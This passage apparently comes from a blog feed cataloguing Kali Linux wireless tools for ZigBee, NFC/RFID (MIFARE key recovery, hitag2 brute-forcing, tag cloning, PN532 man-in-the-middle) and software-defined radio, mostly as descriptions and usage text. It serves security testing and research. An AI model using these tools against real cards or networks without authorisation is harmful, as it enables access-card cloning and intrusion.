process libpcap or Daintree SNA capture files.    <a href="&#109;&#x61;&#105;&#x6c;&#x74;&#111;&#x3a;&#106;&#119;&#x72;&#x69;&#103;&#x68;&#116;&#64;&#x77;&#105;&#x6c;&#108;&#x68;&#97;&#x63;&#x6b;&#102;&#111;&#x72;&#115;&#117;&#115;&#104;&#105;&#46;&#x63;&#x6f;&#x6d;">&#x6a;&#x77;&#114;&#x69;&#x67;&#x68;&#116;&#x40;&#x77;&#105;&#x6c;&#108;&#104;&#x61;&#99;&#107;&#x66;&#111;&#x72;&#115;&#117;&#115;&#104;&#105;&#46;&#99;&#x6f;&#109;</a></p>

<p>Usage: zbdsniff [capturefiles &hellip;]
```</p>

<p><strong>zbdump</strong></p>

<p>A tcpdump-like tool for ZigBee/IEEE 802.15.4 networks</p>

<p>``` plain
zbdump &ndash; a tcpdump-like tool for ZigBee/IEEE 802.15.4 networks
Compatible with Wireshark 1.1.2 and later &ndash; <a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#58;&#106;&#119;&#114;&#x69;&#x67;&#104;&#x74;&#x40;&#119;&#105;&#108;&#108;&#x68;&#97;&#x63;&#x6b;&#102;&#111;&#x72;&#x73;&#117;&#115;&#104;&#x69;&#46;&#99;&#x6f;&#x6d;">&#x6a;&#x77;&#x72;&#x69;&#x67;&#x68;&#116;&#64;&#x77;&#x69;&#108;&#x6c;&#x68;&#97;&#99;&#x6b;&#102;&#x6f;&#114;&#115;&#x75;&#115;&#x68;&#105;&#46;&#x63;&#x6f;&#109;</a></p>

<p>Usage: zbdump [-fiwDch] [-f channel] [-w pcapfile] [-W daintreefile]</p>

<pre><code>     [-i devnumstring]
</code></pre>

<p>```</p>

<p><strong>zbfind</strong></p>

<p>zbfind provides a GTK-based GUI to the user which displays the results of a zbstumbler-like functionality. zbfind sends beacon requests as it cycles through channels and listens for a response, adding the response to a table as well as displaying signal strength on a gauge widget.</p>

<p><img class="center" src="/images/kali/wifi/zbfind.png" title="&lsquo;zbfind&rsquo; &lsquo;zbfind&rsquo;" ></p>

<p><strong>zbgoodfind</strong></p>

<p>Search a binary file to identify the encryption key for a given
SNA or libpcap IEEE 802.15.4 encrypted packet</p>

<p>``` plain
zbgoodfind &ndash; search a binary file to identify the encryption key for a given
SNA or libpcap IEEE 802.15.4 encrypted packet &ndash; <a href="&#x6d;&#97;&#x69;&#108;&#x74;&#111;&#x3a;&#x6a;&#x77;&#114;&#x69;&#103;&#x68;&#x74;&#x40;&#x77;&#x69;&#x6c;&#108;&#x68;&#x61;&#99;&#107;&#102;&#111;&#x72;&#115;&#117;&#x73;&#x68;&#105;&#46;&#x63;&#x6f;&#x6d;">&#x6a;&#x77;&#114;&#105;&#103;&#104;&#x74;&#64;&#119;&#x69;&#108;&#x6c;&#104;&#x61;&#x63;&#107;&#102;&#x6f;&#114;&#x73;&#117;&#x73;&#x68;&#105;&#46;&#x63;&#x6f;&#x6d;</a></p>

<p>Usage: zbgoodfind [-frRFd] [-f binary file] [-r pcapfile] [-R daintreefile]</p>

<pre><code>     [-F Don't skip 2-byte FCS at end of each frame]
     [-d genenerate binary file (test mode)]
</code></pre>

<p>```</p>

<p><strong>zbreplay</strong></p>

<p>Replay ZigBee/802.15.4 network traffic from libpcap or Daintree files</p>

<p>``` plain
zbreplay: replay ZigBee/802.15.4 network traffic from libpcap or Daintree files
<a href="&#109;&#97;&#105;&#x6c;&#116;&#111;&#x3a;&#106;&#x77;&#x72;&#x69;&#x67;&#104;&#x74;&#64;&#119;&#105;&#x6c;&#108;&#x68;&#97;&#99;&#107;&#102;&#111;&#x72;&#x73;&#117;&#115;&#104;&#x69;&#x2e;&#99;&#x6f;&#109;">&#106;&#119;&#114;&#x69;&#x67;&#x68;&#116;&#64;&#x77;&#x69;&#108;&#x6c;&#x68;&#x61;&#99;&#107;&#x66;&#111;&#114;&#115;&#117;&#115;&#x68;&#x69;&#46;&#x63;&#111;&#x6d;</a></p>

<p>Usage: zbreplay [-rRfiDch] [-f channel] [-r pcapfile] [-R daintreefile]</p>

<pre><code>     [-i devnumstring] [-s delay/float] [-c countpackets]
</code></pre>

<p>```</p>

<p><strong>zbstumbler</strong></p>

<p>Transmit beacon request frames to the broadcast address while
channel hopping to identify ZC/ZR devices.</p>

<p>``` plain
zbstumbler: Transmit beacon request frames to the broadcast address while
channel hopping to identify ZC/ZR devices.  <a href="&#x6d;&#97;&#105;&#108;&#116;&#111;&#x3a;&#x6a;&#x77;&#x72;&#x69;&#103;&#104;&#x74;&#x40;&#x77;&#105;&#x6c;&#108;&#x68;&#97;&#99;&#x6b;&#102;&#111;&#114;&#x73;&#x75;&#x73;&#104;&#105;&#x2e;&#99;&#111;&#x6d;">&#106;&#119;&#114;&#x69;&#x67;&#x68;&#116;&#x40;&#x77;&#x69;&#x6c;&#108;&#x68;&#97;&#99;&#107;&#102;&#x6f;&#114;&#x73;&#x75;&#115;&#104;&#105;&#46;&#99;&#x6f;&#x6d;</a></p>

<p>Usage: zbstumbler [-iscwD] [-i devnumstring] [-s per-channel delay] [-c channel]</p>

<pre><code>                      [-w report.csv]
</code></pre>

<p>```</p>

<h3>RFID / NFC Tools</h3>

<h3>NFC Tools</h3>

<p><strong>mfcuk</strong></p>

<p>Toolkit containing samples and various tools based on and around libnfc and crapto1, with emphasis on Mifare Classic NXP/Philips RFID cards. Special emphasis of the toolkit is on the following:</p>

<ul>
<li><p>mifare classic weakness demonstration/exploitation</p></li>
<li><p>demonstrate use of libnfc (and ACR122 readers)</p></li>
<li><p>demonstrate use of Crapto1 implementation to confirm internal workings and to verify theoretical/practical weaknesses/attacks</p></li>
</ul>


<p><strong>mfoc</strong></p>

<p>MFOC is an open source implementation of âoffline nestedâ attack by Nethemba.
This program allow to recover authentication keys from MIFARE Classic card.
Please note MFOC is able to recover keys from target only if it have a known key: default one (hardcoded in MFOC) or custom one (user provided using command line).</p>

<p><strong>mfterm</strong></p>

<p>A terminal interface for working with Mifare tags.</p>

<p>The  program  is  used as an interactive shell to read and write Mifare
tags using libnfc and a libnfc compatible reader or to  simply  manipulate Mifare data dumps from files.</p>

<p>``` plain
A terminal interface for working with Mifare Classic tags.
Usage: mfterm [-v] [-h] [-k keyfile]</p>

<p>Options:
  &mdash;help          (-h)   Show this help message.
  &mdash;version       (-v)   Display version information.
  &mdash;tag=tagfile   (-t)   Load a tag from the specified file.
  &mdash;keys=keyfile  (-k)   Load keys from the specified file.
  &mdash;dict=dictfile (-d)   Load dictionary from the specified file.</p>

<p>Report bugs to: <a href="&#109;&#x61;&#105;&#108;&#116;&#111;&#x3a;&#x61;&#x6e;&#x64;&#x65;&#114;&#115;&#64;&#52;&#x7a;&#109;&#x2e;&#111;&#x72;&#103;">&#97;&#110;&#x64;&#101;&#114;&#115;&#64;&#x34;&#x7a;&#x6d;&#x2e;&#111;&#x72;&#103;</a>
mfterm home page: <a href="https://github.com/4zm/mfterm">https://github.com/4zm/mfterm</a>
```</p>

<p><strong>mifare-classic-format</strong></p>

<p>``` plain
usage: mifare-classic-format [-fy] [keyfile]</p>

<p>Options:
  -f      Fast format (only erase MAD)
  -y      Do not ask for confirmation (dangerous)
  keyfile Use keys from dump in addition to internal default keys
```</p>

<p><strong>nfc-list</strong></p>

<p>nfc-list  is  a utility for listing any available tags like ISO14443-A,
FeliCa, Jewel or ISO14443-B (according to the device capabilities).  It
may  detect several tags at once thanks to a mechanism called anti-collision but all types of tags don&rsquo;t support anti-collision and there  is
some physical limitation of the number of tags the reader can discover.</p>

<p>This tool displays all available information at selection time.</p>

<p><code>plain
nfc-list uses libnfc 1.7.0
usage: nfc-list [-v]
  -v     verbose display
</code></p>

<p><strong>nfc-mfclassic</strong></p>

<p>nfc-mfclassic is a MIFARE Classic tool that allow to read or write DUMP
file using MIFARE keys provided in KEYS file.</p>

<p>``` plain
Usage: nfc-mfclassic r|R|w|W a|b &lt;dump.mfd> [&lt;keys.mfd> [f]]
  r|R|w|W       &ndash; Perform read from &reg; or unlocked read from &reg; or write to (w) or unlocked write to (W) card</p>

<pre><code>              *** note that unlocked write will attempt to overwrite block 0 including UID
              *** unlocked read does not require authentication and will reveal A and B keys
              *** unlocking only works with special Mifare 1K cards (Chinese clones)
</code></pre>

<p>  a|A|b|B       &ndash; Use A or B keys for action; Halt on errors (a|b) or tolerate errors (A|B)
  &lt;dump.mfd>    &ndash; MiFare Dump (MFD) used to write (card to MFD) or (MFD to card)
  &lt;keys.mfd>    &ndash; MiFare Dump (MFD) that contain the keys (optional)
  f             &ndash; Force using the keyfile even if UID does not match (optional)
```</p>

<h3>RFIDiot ACG</h3>

<h3>RFIDiot FROSCH</h3>

<h3>RFIDiot PCSC</h3>

<p>A collection of tools and libraries for exploring RFID technology, written
in Python.</p>

<p><strong>ChAP.py</strong></p>

<p>Script that tries to select the EMV Payment Systems Directory on all inserted cards.</p>

<p><strong>bruteforce.py</strong></p>

<p>Try random numbers to login to sector 0</p>

<p><strong>cardselect.py</strong></p>

<p>Select card and display ID</p>

<p><strong>copytag.py</strong></p>

<p>Read all sectors from a standard tag and write them back to a blank</p>

<p><strong>demotag.py</strong></p>

<p>Test IAIK TUG DemoTag</p>

<p><strong>eeprom.py</strong></p>

<p>Display reader&rsquo;s eeprom settings</p>

<p><strong>fdxbnum.py</strong></p>

<p>Generate / decode FDX-B EM4x05 compliant IDs</p>

<p><strong>formatmifare1kvalue.py</strong></p>

<p>Format value blocks on a mifare standard tag</p>

<p><strong>froschtest.py</strong></p>

<p>Test frosch HTRM112 reader</p>

<p><strong>hidprox.py</strong></p>

<p>Show HID Prox card type and site/id code</p>

<p><strong>hitag2brute.py</strong></p>

<p>Brute Force hitag2 password</p>

<p><strong>hitag2reset.py</strong></p>

<p>Reset hitag2 password</p>

<p><strong>isotype.py</strong></p>

<p>Determine ISO tag type</p>

<p><strong>jcopmifare.py</strong></p>

<p>Test program for mifare emulation on JCOP</p>

<p><strong>jcopsetatrhist.py</strong></p>

<p>Set ATR History bytes on JCOP cards</p>

<p><strong>jcoptool.py</strong></p>

<p>JCOP card toolkit</p>

<p><strong>lfxtype.py</strong></p>

<p>Select card and display tag type</p>

<p><strong>loginall.py</strong></p>

<p>Attempt to login to each sector with transport keys</p>

<p><strong>mifarekeys.py</strong></p>

<p>Calculate 3DES key for Mifare access on JCOP cards</p>

<p><strong>mrpkey.py</strong></p>

<p>Calculate 3DES key for Machine Readable Passport</p>

<p><strong>multiselect.py</strong></p>

<p>Continuously select card and display ID</p>

<p><strong>nfcid.py</strong></p>

<p>Python code for Identifying NFC cards</p>

<p><strong>pn532emulate.py</strong></p>

<p>Switch NXP PN532 reader chip into TAG emulation mode</p>

<p><strong>pn532mitm.py</strong></p>

<p>NXP PN532 Man-In-The_Middle &ndash; log conversations between TAG and external reader</p>

<p><strong>q5reset.py</strong></p>

<p>Reset q5 tag</p>

<p><strong>readlfx.py</strong></p>

<p>Read all sectors from a LFX reader</p>

<p><strong>readmifare1k.py</strong></p>

<p>Read all sectors from a mifare standard tag</p>

<p><strong>readmifaresimple.py</strong></p>

<p>Read all sectors from a mifare tag</p>

<p><strong>readmifareultra.py</strong></p>

<p>Read all sectors from a Ultralight tag</p>

<p><strong>readtag.py</strong></p>

<p>Read all sectors from a standard tag</p>

<p><strong>rfidiot-cli.py</strong></p>

<p>CLI for rfidiot</p>

<p><strong>send_apdu.py</strong></p>

<p>Python code for Sending raw APDU commands</p>

<p><strong>sod.py</strong></p>

<p>Try to find X509 data in EF.SOD</p>

<p><strong>transit.py</strong></p>

<p>Generate / decode FDI Matalec Transit 500 and Transit 999 UIDs</p>

<p><strong>unique.py</strong></p>

<p>Generate EM4x02 and/or UNIQUE compliant IDs</p>

<p><strong>writelfx.py</strong></p>

<p>Read and then write all sectors from a LFX reader</p>

<p><strong>writemifare1k.py</strong></p>

<p>Write all blocks on a mifare standard tag</p>

<p>Check <a href="http://rfidiot.org/">http://rfidiot.org/</a> for more information and examples</p>

<h3>Software Defined Radio</h3>

<p><strong>gnuradio-companion</strong></p>

<p>A graphical tool for creating signal flow graphs and generating flow-graph source code.</p>

<p><img class="center" src="/images/kali/wifi/gnuradio.png" title="&lsquo;gnuradio-companion&rsquo; &lsquo;gnuradio&rsquo;" ></p>

<p><strong>gqrx</strong></p>

<p>Gqrx is a software defined radio receiver powered by the GNU Radio SDR framework and the Qt graphical toolkit. Gqrx supports many of the SDR hardware available, including Funcube Dongles, rtl-sdr, HackRF and USRP devices.</p>

<p>Currently it works on Linux and Mac and supports the following devices:. Funcube Dongle Pro and Pro+ RTL2832U-based DVB-T dongles (rtlsdr via USB and TCP) OsmoSDR USRP HackRF Jawbreaker Nuand bladeRF any other device supported by the gr-osmosdr library</p>

<p>The latest stable version of Gqrx is 2.2, it is available for Linux, FreeBSD and Mac and it offers the following features:</p>

<ul>
<li><p>Discover devices attached to the computer.</p></li>
<li><p>Process I/Q data from the supported devices.</p></li>
<li><p>Change frequency, gain and apply various corrections (frequency, I/Q balance).</p></li>
<li><p>AM, SSB, FM-N and FM-W (mono and stereo) demodulators.</p></li>
<li><p>Special FM mode for NOAA APT.</p></li>
<li><p>Variable band pass filter.</p></li>
<li><p>AGC, squelch and noise blankers.</p></li>
<li><p>FFT plot and waterfall.</p></li>
<li><p>Record and playback audio to / from WAV file.</p></li>
<li><p>Spectrum analyzer mode where all signal processing is disabled.</p></li>
</ul>


<p><img class="center" src="/images/kali/wifi/gqrx.png" title="&lsquo;gqrx&rsquo; &lsquo;gqrx&rsquo;" ></p>

<p><strong>gr-scan</strong></p>

<p>gr-scan is a program written in C++, and built upon GNU Radio, rtl-sdr, and the OsmoSDR Source Block. It is intended to scan a range of frequencies and print a list of discovered signals. It should work with any device that works with that block, including Realtek RTL2832U devices. This software was developed using a Compro U620F, which uses an E4000 tuner</p>

<p><img class="center" src="/images/kali/wifi/gr-scan.png" title="&lsquo;gr-scan&rsquo; &lsquo;gr-scan&rsquo;" ></p>

<p><strong>modes_gui</strong></p>

<p>Part of gr-air-modes</p>

<p>gr-air-modes implements a software-defined radio receiver for Mode S
transponder signals, including ADS-B reports from equipped aircraft.</p>

<p><strong>rtl_adsb</strong></p>

<p>A simple ADS-B decoder</p>

<p><img class="center" src="/images/kali/wifi/rtl_adsb.png" title="&lsquo;rtl_adsb&rsquo; &lsquo;rtl_adsb&rsquo;" ></p>

<p><strong>rtl_fm</strong></p>

<p>A simple narrow band FM demodulator for RTL2832 based DVB-T receivers</p>

<p>``` plain
Use:    rtl_fm -f freq [-options] [filename]</p>

<pre><code>-f frequency_to_tune_to [Hz]
 (use multiple -f for scanning, requires squelch)
 (ranges supported, -f 118M:137M:25k)
[-s sample_rate (default: 24k)]
[-d device_index (default: 0)]
[-g tuner_gain (default: automatic)]
[-l squelch_level (default: 0/off)]
[-o oversampling (default: 1, 4 recommended)]
[-p ppm_error (default: 0)]
[-E sets lower edge tuning (default: center)]
[-N enables NBFM mode (default: on)]
[-W enables WBFM mode (default: off)]
 (-N -s 170k -o 4 -A fast -r 32k -l 0 -D)
filename (a '-' dumps samples to stdout)
 (omitting the filename also uses stdout)
</code></pre>

<p>Experimental options:</p>

<pre><code>[-r output_rate (default: same as -s)]
[-t squelch_delay (default: 20)]
 (+values will mute/scan, -values will exit)
[-M enables AM mode (default: off)]
[-L enables LSB mode (default: off)]
[-U enables USB mode (default: off)]
[-R enables raw mode (default: off, 2x16 bit output)]
[-F enables high quality FIR (default: off/square)]
[-D enables de-emphasis (default: off)]
[-C enables DC blocking of output (default: off)]
[-A std/fast/lut choose atan math (default: std)]
</code></pre>

<p>Produces signed 16 bit ints, use Sox or aplay to hear them.</p>

<pre><code>rtl_fm ... - | play -t raw -r 24k -e signed-integer -b 16 -c 1 -V1 -
             | aplay -r 24k -f S16_LE -t raw -c 1
  -s 22.5k - | multimon -t raw /dev/stdin
</code></pre>

<p>```</p>

<p><strong>rtl_sdr</strong></p>

<p>An I/Q recorder for RTL2832 based DVB-T receivers</p>

<p>``` plain
Usage:   -f frequency_to_tune_to [Hz]</p>

<pre><code>[-s samplerate (default: 2048000 Hz)]
[-d device_index (default: 0)]
[-g gain (default: 0 for auto)]
[-b output_block_size (default: 16 * 16384)]
[-n number of samples to read (default: 0, infinite)]
[-S force sync output (default: async)]
filename (a '-' dumps samples to stdout)
</code></pre>

<p>```</p>

<p><strong>rtlsdr-scanner</strong></p>

<p>A cross platform Python frequency scanning GUI for USB TV dongles, using the OsmoSDR rtl-sdr library.
In other words a cheap, simple Spectrum Analyser.
The scanner attempts to overcome the tunerâs frequency response by averaging scans from both the positive and negative frequency offets of the baseband data.</p>

<p><img class="center" src="/images/kali/wifi/rtlsdr-scanner.png" title="&lsquo;rtlsdr-scanner&rsquo; &lsquo;rtlsdr-scanner&rsquo;" ></p>

<p><strong>rtl_tcp</strong></p>

<p>An I/Q spectrum server for RTL2832 based DVB-T receivers</p>

<p>``` plain
Usage:  [-a listen address]</p>

<pre><code>[-p listen port (default: 1234)]
[-f frequency to tune to [Hz]]
[-g gain (default: 0 for auto)]
[-s samplerate in Hz (default: 2048000 Hz)]
[-b number of buffers (default: 32, set by library)]
[-n max number of linked list buffers to keep (default: 500)]
[-d device index (default: 0)]
</code></pre>

<p>```</p>

<p><strong>rtl_test</strong></p>

<p>A benchmark tool for RTL2832 based DVB-T receivers</p>

<p>``` plain
Usage:</p>

<pre><code>[-s samplerate (default: 2048000 Hz)]
[-d device_index (default: 0)]
[-t enable Elonics E4000 tuner benchmark]
[-p enable PPM error measurement]
[-b output_block_size (default: 16 * 16384)]
[-S force sync output (default: async)]
</code></pre>

<p>```</p>

<blockquote><p>Noise proves nothing.  Often a hen who has merely laid an egg cackles
as if she laid an asteroid.</p>

<p>&mdash; Mark Twain</p></blockquote>
]]></content>
  </entry>
  
</feed>
